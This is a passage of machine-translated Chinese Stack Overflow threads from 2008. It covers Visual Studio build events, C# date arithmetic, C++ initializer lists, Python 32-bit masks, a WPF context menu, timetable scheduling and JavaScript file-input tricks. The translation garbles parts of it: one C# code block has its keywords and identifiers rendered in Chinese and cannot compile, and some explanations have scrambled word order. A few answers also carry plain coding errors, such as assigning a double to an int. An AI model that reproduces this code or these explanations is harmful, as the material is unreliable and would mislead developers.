您还应该注意，您可以通过在派生类中覆盖它并返回不同的值来为说 PropertyA 返回不同的东西。

# visual-studio - 从 VC6/VC2005/VC2008 项目文件调用批处理/脚本文件

> ID：210606
> 
> 赞同：1
> 
> 时间：2008-10-16T23:16:50.813
> 
> 标签：visual-studio, batch-file, scripting, project

有没有办法从 VC6（及更高版本）项目文件中调用外部脚本或批处理文件？

我有一个后台进程，在尝试构建某些项目（DLLS、可执行文件）之前我需要杀死它，并且还没有找到从项目本身成功完成此操作的方法。我只想调用一个带有 taskkill 命令的批处理文件。

（是的，我可以在构建项目之前从命令行运行批处理文件，但我并不总是记得这样做，并且自动完成对整个开发团队来说更方便且不那么烦人。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T15:49:55.940

您可以创建具有构建后事件的实用程序项目（配置类型：项目属性页面中的实用程序）。然后，您从该 Post-Build 事件中调用批处理文件。如果我没记错的话，实用程序配置出现在 VS2005 中。但我相信在 VC6 上使用另一种类型的配置也可以达到同样的效果。

这是一个设置示例（这是构建后事件的命令行属性的文本）：

```
set solutionDir=$(SolutionDir)
set platformName=$(PlatformName)
set configurationName=$(ConfigurationName)

call $(SolutionDir)PostBuild.bat 
```

如您所见，您拥有基于 VisualStudio 宏自定义批处理环境的所有灵活性。

如果您希望每次构建时都调用此批处理文件，请将依赖项添加到需要的项目（例如，您的主可执行文件或 dll 项目）。您可以将批处理文件添加到解决方案项以方便访问（右键单击解决方案并选择添加 -> 现有项...）。

您甚至可以在此实用程序项目上调用 build 命令来强制执行批处理文件。

在工作中，我们有一个类似的设置来在每次触发构建时开始我们的单元测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-16T23:22:45.263

[您可以从自定义构建步骤或构建事件](http://msdn.microsoft.com/en-us/library/e85wte0k(VS.80).aspx)中调用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T23:53:50.350

至少对于 Visual Studio 2008 中的 C#，您可以打开项目文件并在文件中找到以下注释：

```
<!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
   Other similar extension points exist, see Microsoft.Common.targets.
<Target Name="BeforeBuild">
</Target>
<Target Name="AfterBuild">
</Target>
--> 
```

取消注释最适合您的选项，在本例中为“BeforeBuild”项。然后用你的批处理文件替换我这里的批处理文件：

```
<Target Name="BeforeBuild">
   <Exec Command="MyBatchFile.bat" />
</Target> 
```

这里的所有都是它的; 每当您构建该项目时，每次都会发生这种情况。

也就是说，我不知道这是否适用于 VS 2005 或特别是 VC6。**YMMV！**

# c# - 2 DateTime 之间的确切时间？

> ID：210607
> 
> 赞同：8
> 
> 时间：2008-10-16T23:17:36.757
> 
> 标签：c#, .net, datetime, .net-2.0

我想知道两个日期之间有多少分钟？

示例：现在 - 明天在确切时间将返回 1440。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-16T23:20:57.327

```
DateTime dt1 = DateTime.Now;
DateTime dt2 = DateTime.Now.AddDays(1);

int diff = dt2.Subtract(dt1).TotalMinutes; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-16T23:19:13.413

查看 TimeSpan 类。

```
 DateTime date1 = DateTime.Now;
        DateTime date2 = DateTime.Now.AddDays(1);

        TimeSpan diff = date2.Subtract(date1);
        Console.WriteLine(diff.Minutes); 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2008-10-16T23:19:30.013

```
DateTime currentTime = DateTime.Now;
DateTime tommorowTime = currentTime.AddDays(1);
TimeSpan diffTime = tommorowTime - currentTime ;
Console.WriteLine(diffTime.TotalMinutes); 
```

# c++ - 构造函数中冒号后面的成员变量列表有什么用？

> ID：210616
> 
> 赞同：11
> 
> 时间：2008-10-16T23:20:32.770
> 
> 标签：c++, constructor

我正在阅读这个 C++ 开源代码，我来到了一个构造函数，但我不明白（基本上是因为我不懂 C++ :P）

我非常了解 C 和 Java。

```
 TransparentObject::TransparentObject( int w, int x, int y, int z ) : 
     _someMethod( 0 ),
     _someOtherMethod( 0 ),
     _someOtherOtherMethod( 0 ),
     _someMethodX( 0 ) 
  {
       int bla;
       int bla;
  } 
```

据我所知，第一行只声明了构造函数的名称，“::”对我来说听起来像是“属于”的。{} 之间的代码是它自己的构造函数体。

我“认为”参数和第一个“{”之后的内容就像方法默认参数或其他东西，但我在网上找不到合理的解释。我在示例中发现的大多数 C++ 构造函数与 Java 中的构造函数几乎相同。

我的假设是对的吗？"::" 就像是属于，params 和 body 之后的列表就像 "default args" 什么的？

**更新：** 感谢您的回答。这些可以称为方法吗？（我猜不是）在构造函数体内调用它们有什么区别

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2008-10-16T23:28:00.510

最常见的情况是这样的：

```
class foo{
private:
    int x;
    int y;
public:
    foo(int _x, int _y) : x(_x), y(_y) {}
} 
```

这将设置`x`并设置为在构造函数参数`y`中给出的值`_x`。`_y`这通常是构造任何声明为数据成员的对象的最佳方式。

您也可能正在查看构造函数链接：

```
class foo : public bar{
    foo(int x, int y) : bar(x, y) {}
}; 
```

在这种情况下，类的构造函数将调用其基类的构造函数并传递值`x`和`y`。

进一步剖析函数：

```
TransparentObject::TransparentObject( int w, int x, int y, int z ) : 
   _someMethod( 0 ),
   _someOtherMethod( 0 ),
   _someOtherOtherMethod( 0 ),
   _someMethodX( 0 ) 
{
     int bla;
     int bla;
} 
```

-`::`运算符称为范围解析运算符。它基本上只是表明它`TransparentObject`是 的成员`TransparentObject`。其次，假设构造函数的主体出现在花括号中是正确的。

> 更新：感谢您的回答。这些可以称为方法吗？（我猜不是）在构造函数体内调用它们有什么区别

关于这个主题的信息比我[在这里](http://www.parashift.com/c++-faq-lite/ctors.html#faq-10.6)给你的要多得多。您必须使用初始化器列表的最常见区域是当您初始化引用或 a 时`const`，因为这些变量必须在创建时立即被赋予一个值。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-16T23:30:02.410

你很接近。第一行是声明。:: 左边的标签是类名，要成为构造函数，函数名必须与类名相同。

```
TransparentObject::TransparentObject( int w, int x, int y, int z ) 
```

在 C++ 中，您可以选择在函数体开始之前放置一个冒号和一些成员变量的初始值。**如果您正在初始化任何const**变量或将参数传递给超类构造函数，则必须使用此技术。

```
: 
 _someMethod( 0 ),
 _someOtherMethod( 0 ),
 _someOtherOtherMethod( 0 ),
 _someMethodX( 0 ) 
```

然后是大括号中的构造函数的主体。

```
{
   int bla;
   int bla;
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-16T23:26:55.597

:: 实际上意味着包含（请参阅注释以进行澄清），但是 _someMethods 等等就是所谓的[初始化列表](http://www.cprogramming.com/tutorial/initialization-lists-c++.html)。链接上有很多信息=]

编辑：对不起，我的第一句话不正确 - 请参阅评论。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-16T23:27:14.490

是的， :: 是 C++ 范围运算符，它可以让您告诉编译器函数属于什么。在构造函数声明之后使用 : 开始所谓的初始化列表。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-16T23:27:45.050

参数列表和`{}`s 之间的代码指定（某些）类成员的初始化。

初始化而不是赋值——它们是不同的东西——所以这些都是对构造函数的调用。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-16T23:27:01.980

你是对的。它是一种为类变量设置默认值的方法。我不太熟悉将它们放在 : 之后和函数体中的确切区别。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-11-30T17:13:20.140

使用初始化列表通常有一些很好的理由。一方面，您不能设置在构造函数的初始化列表之外引用的成员变量。此外，如果成员变量需要为其自己的构造函数提供某些参数，则必须在此处传递它们。比较一下：

```
class A
{
public:
  A();
private:
  B _b;
  C& _c;
};

A::A( C& someC )
{
  _c = someC; // this is illegal and won't compile. _c has to be initialized before we get inside the braces
  _b = B(NULL, 5, "hello"); // this is not illegal, but B might not have a default constructor or could have a very 
                            // expensive construction that shouldn't be done more than once
} 
```

到这个版本：

```
A::A( C& someC )
: _b(NULL, 5, "hello") // ok, initializing _b by passing these arguments to its constructor
, _c( someC ) // this reference to some instance of C is correctly initialized now
{} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-11-12T13:02:22.387

在不使用初始化列表的情况下，所有类成员都将简单地调用其默认构造函数，因此这是您可以控制调用*哪个*构造函数的唯一位置（对于非动态分配的成员）。调用哪个父类构造函数也是如此。

类成员在构造函数的主体中“初始化”（即在 {} 大括号之间使用 = 运算符）在技术上不是初始化，而是一个赋值。对于具有非平凡构造函数/析构函数的类，默认构造然后以这种方式通过赋值进行修改可能会很昂贵。对于引用成员，您*必须*使用初始化列表，因为它们不能通过赋值运算符进行更改。

如果成员（或父类）没有默认构造函数，则未能在初始化列表中指定适当的构造函数将导致编译器生成错误。否则编译器将插入默认构造函数调用本身。对于内置类型，这没有任何作用，因此您将在那里有垃圾值。

**请注意，在初始化程序列表中指定成员的顺序不会影响调用它们的顺序**。它总是首先是父类构造函数（如果有的话），然后是类成员（按照它们在类定义中定义的顺序）。将它们放在初始化列表中的顺序无关紧要，并且可能是细微错误的来源......

在下面的人为示例中，看起来意图是`m_b`用`value`then `m_a`with初始化`m_b`，但实际发生的是`m_a`用 初始化`m_b`（它本身尚未初始化）然后`m_b`用 初始化`value`。`m_b`只会包含垃圾！

```
struct BadInitialiserListExample
{
    BadInitialiserListExample(int value) :
        m_b(value),
        m_a(m_b)      // <-- *BUG* this is actually executed first due to ordering below!
    {
    }

    int    m_a;
    int    m_b;
}; 
```

# asp.net - ASP.NET HTTP 处理程序和全局变量

> ID：210620
> 
> 赞同：3
> 
> 时间：2008-10-16T23:21:32.927
> 
> 标签：asp.net, httphandler

我已经创建了 HTTP 处理程序。

如何像使用 global.asax 中的 ASP.net 网页一样为这些处理程序创建全局变量？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-16T23:24:28.350

将变量添加到 Application 实例：

```
System.Web.HttpContext.Current.Application["MyGlobalVariable"] = myValue; 
```

或者，如果变量只需要在单个请求的生命周期内存在，请使用 Context 对象的 Items 集合：

```
System.Web.HttpContext.Current.Items["MyGlobalVariable"] = myValue; 
```

同样，这将只存在于单个请求的生命周期中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T23:32:41.467

如果您的处理程序被指定为可重用，您还可以使用静态类成员。

# python - Python：无符号 32 位按位算术

> ID：210629
> 
> 赞同：35
> 
> 时间：2008-10-16T23:25:31.217
> 
> 标签：python, math

试图回答另一个解决方案处理 IP 地址和网络掩码的帖子时，我被简单的按位算术困住了。

假设输入是“32位”（可能是负数）整数或长整数，并且结果必须在范围内很长 [ 0, 2**32]？

换句话说，我需要一个工作 Python 对应于无符号长整数之间的 C 位运算。

编辑：具体问题是这样的：

```
>>> m = 0xFFFFFF00   # netmask 255.255.255.0
>>> ~m
-4294967041L         # wtf?! I want 255 
```

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2008-10-17T00:27:26.710

您可以使用[ctypes](http://docs.python.org/lib/module-ctypes.html)及其`c_uint32`：

```
>>> import ctypes
>>> m = 0xFFFFFF00
>>> ctypes.c_uint32(~m).value
255L 
```

所以我在这里所做的是转换`~m`为 C 32 位无符号整数并以 Python 格式检索其值。

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2008-10-17T00:28:43.257

您可以通过以下方式屏蔽所有内容`0xFFFFFFFF`：

```
>>> m = 0xFFFFFF00
>>> allf = 0xFFFFFFFF
>>> ~m & allf
255L 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2008-10-17T00:04:03.730

```
from numpy import uint32 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-01-22T16:10:58.523

您也可以与 0xFFFFFFFF 进行异或，这相当于“无符号补码”。

```
>>> 0xFFFFFF00 ^ 0xFFFFFFFF
255 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-17T07:45:07.650

这是我很久以前创建的一个模块，它可能对您有所帮助：

[IPv4Utils](http://pypi.python.org/pypi/IPv4_Utils/0.35)

它至少提供了一个`CIDR`具有子网算法的类。检查模块末尾的测试用例以获取示例。

# .net - 将菜单项添加到默认上下文菜单

> ID：210634
> 
> 赞同：10
> 
> 时间：2008-10-16T23:27:19.293
> 
> 标签：.net, wpf, contextmenu, menuitem

我想将一个菜单项添加到默认`ContextMenu`的`RichTextBox`.

我可以创建一个新的上下文菜单，但随后我丢失了默认菜单中显示的拼写检查建议。

有没有办法在不重新实现所有内容的情况下添加项目？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-17T03:07:32.890

用拼写建议、剪切、粘贴等重新实现 RichTextBox 上下文菜单并不太难。

如下连接上下文菜单打开事件：

```
AddHandler(RichTextBox.ContextMenuOpeningEvent, new ContextMenuEventHandler(RichTextBox_ContextMenuOpening), true);

```

在事件处理程序中根据需要构建上下文菜单。您可以使用以下内容重新创建现有的上下文菜单菜单项：

```
私人 IList<MenuItem> GetSpellingSuggestions()
{
    List<MenuItem> 拼写建议 = new List();
    SpellingError spellingError = myRichTextBox.GetSpellingError(myRichTextBox.CaretPosition);
    如果（拼写错误！= null）
    {
        foreach（spellingError.Suggestions 中的字符串 str）
        {
            菜单项 mi = new MenuItem();
            mi.Header = str;
            mi.FontWeight = FontWeights.Bold；
            mi.Command = EditingCommands.CorrectSpellingError；
            mi.CommandParameter = str;
            mi.CommandTarget = myRichTextBox;
            拼写建议。添加（mi）；
        }
    }
    返回拼写建议；
}

私有 IList<MenuItem> GetStandardCommands()
{
    List<MenuItem> standardCommands = new List();

    菜单项项 = 新菜单项（）；
    item.Command = ApplicationCommands.Cut；
    标准命令。添加（项目）；

    项目 = 新菜单项（）；
    item.Command = ApplicationCommands.Copy；
    标准命令。添加（项目）；

    项目 = 新菜单项（）；
    item.Command = ApplicationCommands.Paste；
    标准命令。添加（项目）；

    返回标准命令；
}

```

如果有拼写错误，您可以使用以下命令创建 Ignore All：

```
MenuItem ignoreAllMI = new MenuItem();
ignoreAllMI.Header = "全部忽略";
ignoreAllMI.Command = EditingCommands.IgnoreSpellingError;
忽略AllMI.CommandTarget = 文本框；
newContextMenu.Items.Add(ignoreAllMI);

```

根据需要添加分隔符。将它们添加到新上下文菜单的项目中，然后添加闪亮的新 MenuItems。

不过，我将继续寻找一种获取实际上下文菜单的方法，因为这与我将在不久的将来进行的工作有关。

# algorithm - 教师时间安排算法

> ID：210635
> 
> 赞同：30
> 
> 时间：2008-10-16T23:27:33.180
> 
> 标签：algorithm, scheduling, np-hard

这是我想了很久的问题。作为老师和程序员的儿子，我很早就想到了……但我仍然没有找到解决方案。

所以这就是问题所在。需要使用一些约束条件为一所学校创建一个时间表。这些通常分为两类：

**健全性检查**

*   一个老师不能同时教两门课
*   学生不能同时上两节课
*   一些教师在一周内必须至少休息一天
*   一周中的所有日子都应包含在时间表中
*   对象 X 每周必须有确切的时间
*   ...

**优先**

*   每位教师的日程安排应尽可能紧凑（即教师应连续工作一天中的所有时间，如果可能，不得停顿）
*   放假的老师应该能够表达对哪一天的偏好
*   从事兼职工作的教师应该能够表达偏好是在上学的开始还是结束时工作。
*   ...

现在，在几年没有找到解决方案（同时学习一两件事......）之后，我意识到这闻起来像是一个 NP 难题。

它被证明是NP难的吗？

有没有人知道如何破解这个东西？

看着[这个](https://stackoverflow.com/questions/184195/seating-plan-software-recommendations-does-such-a-beast-even-exist)问题让我想到了这个问题，以及在这种情况下遗传算法是否可用。然而，在保持健全性检查规则的同时改变可能性是相当困难的。我也不清楚如何区分不兼容的要求。

* * *

一个小的附录，以更好地说明问题。这适用于意大利学校风格的教室，所有学生都在不同的班级（例如：第一年 A 部分）并且教师在班级之间移动。同一班级的所有学生都有相同的时间表，并且无法选择参加哪节课。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-16T23:57:49.920

我是在学生信息系统的调度程序部分工作的开发人员之一。在我们最初的调度问题方法中，我们研究了遗传算法来解决约束满足问题，尽管我们最初是成功的，但我们意识到问题的解决方案并不复杂（在参加了学校调度研讨会之后）

我们当前的实现效果很好，并使用智能启发式的蛮力在短时间内获得有效的时间表。首先制定主时间表（将课程分配给教师），考虑到每位教师的所有限制，同时最大限度地减少学生发生冲突的可能性（基于他们的课程要求）。然后使用相同的方法安排学生上课。

这样做可以让机器先建立一个主计划，然后在需要时让人工对其进行调整。

调度程序当前的实现是用 perl 编写的，但我们早期访问的其他选项是 Prolog 和 CLIPS（专家系统）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T23:42:54.723

我认为您可能缺少一些限制。

人们希望在可能的情况下安排教师参加他们获得认证的课程。

人们会怀疑所要求的课程以及每个课程的预期人数会很大。

我认为开始的地方是列出所有约束，找出一个数据结构来表示它们。

然后创建某种引擎来构建试验解决方案，然后根据约束评估它的适用性。

然后你可以把有趣的遗传算法部分扔给它，看看你是否能让适应度随着基因混合而随着时间的推移而增加。

从一小组约束开始，当你看到成功时增加它们（如果你看到成功）

可能有一种方法可以将约束与线性规划算法之类的东西结合在一起。

我同意。听起来是个有趣的挑战

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T23:56:29.797

这是一个映射问题：您需要映射到一周中的每个小时和每个教师的一项活动（教给某个班级或空闲时间）。

拆分问题：

1.  创建教师、班级和偏好列表，然后让用户在地图上填充一些偏好以作为起点。
2.  如果在列表为空之前没有通过任何健全性检查，则从列表中随机取出一个元素并将其放在地图上的随机空闲位置。如果在任何特定迭代中，您无法在不通过完整性检查的情况下将元素放置在地图上，请在地图上移动两个位置并重试。
3.  填满地图后，尝试在地图上移动位置以优化结果。

在第 2 步和第 3 步中，向用户展示每次迭代：列表中剩余的项目、地图上的位置和下一个计算的移动，并让用户进行干预。

我没有尝试过，但这将是我最初的方法。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-17T00:13:47.047

回答我自己的问题：

gnud提到的FET项目使用了这个算法：

> 关于算法的一些话：FET 使用启发式算法，依次放置活动，从最困难的开始。如果它找不到解决方案，它会将您指向潜在的不可能的活动，因此您可以纠正错误。如果可能，该算法会递归地交换活动，以便为新活动腾出空间，或者在极端情况下，回溯并切换评估顺序。重要的代码在 src/engine/generate.cpp 中。请给我发电子邮件了解详细信息或加入邮件列表。我认为，该算法模仿了人类时间表的操作。

[关联](http://www.lalescu.ro/liviu/fet/helpsupport.html)

* * *

跟进 Wikipedia 上由 Stringent Software 领导的“基于约束的推理”将我带到[这些](http://en.wikipedia.org/wiki/Constraint_satisfaction) [页面](http://en.wikipedia.org/wiki/Complexity_of_constraint_satisfaction)，其中有一段有趣的段落：

> 解决有限域上的约束满足问题通常是一个 NP 完全问题。研究显示了许多多项式时间子情况，主要通过限制允许的域或约束或约束可以放置在变量上的方式来获得。研究还建立了约束满足问题与有限模型理论和数据库等其他领域问题的关系。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-17T09:36:09.410

我过去处理过类似的计划/调度问题，通常最适合此类问题的 AI 技术是“基于约束的推理”。

它基本上是 Laurenty 建议的蛮力方法，但该方法涉及以有效的顺序应用约束以导致不可行的解决方案快速失败 - 以最小化所需的计算。

谷歌搜索“基于约束的推理”提供了大量关于该技术及其在调度问题中的应用的资源。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-24T07:48:45.973

这让我想起了这篇[关于安排会议的博](http://blogs.msdn.com/mswanson/archive/2008/05/03/pdc-2008-conference-scheduling-using-a-genetic-algorithm.aspx)文，这里有一个[视频解释](http://channel9.msdn.com/posts/Charles/Algorithms-and-Data-Structures-Mike-Swanson-Genetic-Session-Scheduler/)。

我会怎么做：

让人口包括两件事：

*   谁教什么课（我希望老师教一门学科）。
*   一门课在特定时间段上的内容。

这样我们就不会发生冲突（一个老师在两个地方，或者一个班级同时有两个科目）。

适应度函数将包括：

*   每个老师每周给多少时间段。
*   一个老师在同一天有多少个时间段（他们不能有一整天的教学，这也必须平衡）。
*   一个班级在同一天有多少个相同科目的时间段（他们不可能有一整天的数学！）。

也许对所有这些都取标准差，因为它们应该是平衡的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-20T21:09:15.797

> 看着这个问题让我想到了这个问题，以及在这种情况下遗传算法是否可用。然而，在保持健全性检查规则的同时改变可能性是相当困难的。我也不清楚如何区分不兼容的要求。

遗传算法非常适合此类问题。一旦你想出了一个体面的染色体表示（在这种情况下，可能是一个表示所有可用类槽的向量），你就大功告成了。

不要担心在突变阶段维护完整性检查。突变是随机的。理智和偏好检查都属于选择阶段。失败的理智检查会大大降低个体的适应度，而失败的偏好只会轻微地降低适应度。

不兼容的要求完全是一个不同的问题。如果它们完全不兼容，您将得到一个不会集中在任何有用的东西上的人口。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-24T08:56:31.717

祝你好运。作为一个有这种问题的父亲的儿子，是什么把我带到了我最终加入的研究小组......

* * *

当我还是个孩子的时候，我父亲安排了当地体育联盟的比赛官员，这也有同样长的限制清单，我试图写一些东西来提供帮助。当我上大学时，我什至将它用作我最后一年的项目，最终确定了蒙特卡洛实施（使用模拟退火模型）。

基本思想是，如果它不是 NP，它就非常接近，所以与其假设有解决方案，我会着手在给定的时间范围内找到最好的解决方案。我会用打破它们的成本来衡量所有约束：健全性检查会产生巨大的成本，偏好会有更低的成本（但会随着更多的中断而增加，所以打破它一次的成本将低于打破它两次的成本的一半）。

基本思想是我从一个“随机”解决方案开始并计算了它的成本；然后通过交换少量作业进行更改，重新评估它，然后概率性地接受或拒绝更改。

经过数千次迭代后，您离可接受的解决方案又近了一步。

不过，请相信我，这类问题的研究小组大量涌现出博士，所以你的公司非常好。

您可能还会对线性规划领域感兴趣，例如[单纯形](http://en.wikipedia.org/wiki/Simplex_method)等。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-02-20T22:16:36.880

是的，我认为这是 NP 完全的——或者至少找到最优解是 NP 完全的。

当我告诉一个朋友的父亲（他是一名教师），如果他没有找到合适的计划，我可以为他解决日程安排问题（这是在 1990 年左右）

我不知道自己陷入了什么境地。幸运的是，我所要做的就是找到一种适合约束的解决方案。但是在我的测试中，我总是担心确定是否有解决方案。他从来没有太多的限制，程序使用不同的启发式和回溯。这很有趣。

我认为比尔·盖茨在高中或大学时也为他的高中研究过这样的系统。不过不确定。

祝你好运。我所有的笔记都不见了，我从来没有时间去实施一个我可以推销的解决方案。这是一个专业项目，我在学习新语言（Basic、Scheme、C、VB、C++）时重新编码

玩得开心

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2010-05-27T12:13:16.060

我看到Prolog程序可以通过将它连接到数据库来解决这个问题，并且程序可以在给定一组约束的情况下使时间表读取abt“约束满足问题序言”

# jquery - jQuery Thickbox 或类似的显示 iFrame？

> ID：210637
> 
> 赞同：6
> 
> 时间：2008-10-16T23:27:50.853
> 
> 标签：jquery, modal-dialog, lightbox

我一直在看[jQUery 厚盒](http://jquery.com/demo/thickbox/)来显示带有图像的模态对话框，它很棒。但是现在我需要以类似的方式显示包含 iFrame 的隐藏内容 div，并带有打开内容的链接。所以我会有这样的东西。

```
<a href="">Open window in Modal Dialog</a>

<div id="myContent">
    <h1>Look at me!</h1>
    <iframe src="http://www.google.com" />
</div> 
```

并且需要在对话框中显示。是否可以？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-16T23:31:34.387

厚盒支持这一点。[请参阅http://jquery.com/demo/thickbox/](http://jquery.com/demo/thickbox/)上的内联内容演示

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T23:36:22.053

我使用 jqModal，它工作得很好而且很轻量级。这是我如何让它与 iFrame 一起使用

这是html

```
<div class="jqmWindow" id="modalDialog">  
    <iframe frameborder="0" id="jqmContent" src=""> 
    </iframe>  
</div> 
```

和调用代码

```
function showModal(url, height, width)
{    
    var dialog = $('#modalDialog')
        .jqm({ 
            onShow: function(h) {
                var $modal = $(h.w);                
                var $modalContent = $("iframe", $modal); 
                $modalContent.html('').attr('src', url); 
                if (height > 0) $modal.height(height);    
                if (width > 0) $modal.width(width);                
                h.w.show();          
            } 
         }).jqmShow();        
}

function closeModal(postback)
{
    $('#modalDialog').jqmHide();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-06-16T20:30:38.797

我有一个 jQueryUI 对话框的扩展，它使用 iFrame 作为它的基本视图......它调整了一些默认值（比如添加一个确定/取消按钮），但应该是你需要的一个不错的基础。我知道这是一个老问题，但只是想让人们意识到它。

[http://plugins.jquery.com/project/jquery-framedialog](http://plugins.jquery.com/project/jquery-framedialog)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-07-22T14:39:10.173

以下是我修复的详细信息。希望您可以将这些更改集成到您的 JQuery 插件中。我正在使用 jquery 1.4.2 和 jquery UI 1.8.2。

在 jquery-frameddialog.js 中，我将宽度和高度更改为 100%（不是 px），然后将 jQueryUI 1.7 的 FIX 更改为以下内容：

```
wrap.bind('dragstart', function() { overlay.show(); })
  .bind('dragstop', function() { overlay.hide(); })
  .bind('resizestart', function() { overlay.show(); })
  .bind('resizestop', function() { overlay.hide(); }); 
```

# c++ - 如何将 CreateWindowEx 限制为仅限字母数字输入？

> ID：210639
> 
> 赞同：1
> 
> 时间：2008-10-16T23:28:41.350
> 
> 标签：c++, windows, winapi

我知道 ES_NUMBER 的存在是为了将 CreateWindowEx 限制为仅限数字输入，是否有类似的机制将其限制为仅限字母数字（az，0-9）输入？或者另一种方法来做类似的事情。我知道我可以事后检查，但我想限制它作为用户类型。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-17T00:03:20.283

检查`EN_UPDATE`消息（通过`WM_COMMAND`）。它在屏幕更新之前发送；您可以检查控件的内容并在它们包含您不想要的任何字符时对其进行修改。

# javascript - 在 JavaScript 中，我可以以编程方式为文件输入元素触发“点击”事件吗？

> ID：210643
> 
> 赞同：267
> 
> 时间：2008-10-16T23:30:36.340
> 
> 标签：javascript, html

我想以`<input type="file">`编程方式在标签上触发点击事件。

只是调用 click() 似乎没有做任何事情，或者至少它没有弹出文件选择对话框。

我一直在尝试使用侦听器捕获事件并重定向事件，但我无法让它像有人点击它那样实际执行事件。

* * *

## 回答 #1

> 赞同：261
> 
> 时间：2010-06-12T21:33:40.890

我一直在寻找解决这一天的方法。这些是我得出的结论：

1.  出于安全原因，Opera 和 Firefox 不允许触发文件输入。
2.  唯一方便的选择是创建一个“隐藏”文件输入（使用不透明度，而不是“隐藏”或“显示：无”！），然后在“下方”创建按钮。通过这种方式，可以看到按钮，但在用户单击时，它实际上会激活文件输入。

希望这可以帮助！:)

```
<div style="display: block; width: 100px; height: 20px; overflow: hidden;">
<button style="width: 110px; height: 30px; position: relative; top: -5px; left: -5px;"><a href="javascript: void(0)">Upload File</a></button>
<input type="file" id="upload_input" name="upload" style="font-size: 50px; width: 120px; opacity: 0; filter:alpha(opacity=0);  position: relative; top: -40px;; left: -20px" />
</div> 
```

* * *

## 回答 #2

> 赞同：81
> 
> 时间：2008-10-16T23:35:10.667

您不能在所有浏览器中都这样做，据说 IE*确实*允许这样做，但 Mozilla 和 Opera 不允许。

当您在 GMail 中撰写邮件时，“附加文件”功能对 IE 和任何支持此功能的浏览器以一种方式实现，然后为 Firefox 和那些不支持此功能的浏览器实现另一种方式。

我不知道您为什么不能这样做，但有一件事情*是*安全风险，并且您在任何浏览器中都不允许这样做，那就是以编程方式在 HTML File 元素上设置文件名。

* * *

## 回答 #3

> 赞同：68
> 
> 时间：2011-07-31T10:11:18.627

您可以在任何浏览器上触发 click()，但某些浏览器需要元素可见且具有焦点。这是一个 jQuery 示例：

```
$('#input_element').show();
$('#input_element').focus();
$('#input_element').click();
$('#input_element').hide(); 
```

它与之前的 hide 一起使用，`click()`但我不知道它是否在不调用 show 方法的情况下工作。从来没有在 Opera 上试过这个，我在 IE/FF/Safari/Chrome 上测试过，它可以工作。我希望这将有所帮助。

* * *

## 回答 #4

> 赞同：30
> 
> 时间：2012-01-19T10:23:21.407

这是可能的：在 FF4+、Opera ?、Chrome 下：但是：

1.  `inputElement.click()`应该从用户操作上下文中调用！（不是脚本执行上下文）

2.  `<input type="file" />`应该是可见的（`inputElement.style.display !== 'none'`）（你可以用可见性或其他东西隐藏它，但不是“显示”属性）

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2014-10-23T12:21:32.477

只需使用标签标签，这样您就可以隐藏输入，并通过其相关标签使其工作 [https://developer.mozilla.org/fr/docs/Web/HTML/Element/Label](https://developer.mozilla.org/fr/docs/Web/HTML/Element/Label)

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2010-08-24T00:36:13.330

对于那些了解您必须在链接上覆盖一个不可见的表单但又懒得写的人，我为您编写了它。好吧，对我来说，但不妨分享。欢迎评论。

HTML（某处）：

```
<a id="fileLink" href="javascript:fileBrowse();" onmouseover="fileMove();">File Browse</a> 
```

HTML（您不关心的地方）：

```
<div id="uploadForm" style="filter:alpha(opacity=0); opacity: 0.0; width: 300px; cursor: pointer;">
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" />
    </form>
</div> 
```

JavaScript：

```
function pageY(el) {
    var ot = 0;
    while (el && el.offsetParent != el) {
        ot += el.offsetTop ? el.offsetTop : 0;
        el = el.offsetParent;
    }
    return ot;
}

function pageX(el) {
    var ol = 0;
    while (el && el.offsetParent != el) {
        ol += el.offsetLeft ? el.offsetLeft : 0;
        el = el.offsetParent;
    }
    return ol;
}

function fileMove() {
    if (navigator.appName == "Microsoft Internet Explorer") {
        return; // Don't need to do this in IE. 
    }
    var link = document.getElementById("fileLink");
    var form = document.getElementById("uploadForm");
    var x = pageX(link);
    var y = pageY(link);
    form.style.position = 'absolute';
    form.style.left = x + 'px';
    form.style.top = y + 'px';
}

function fileBrowse() {
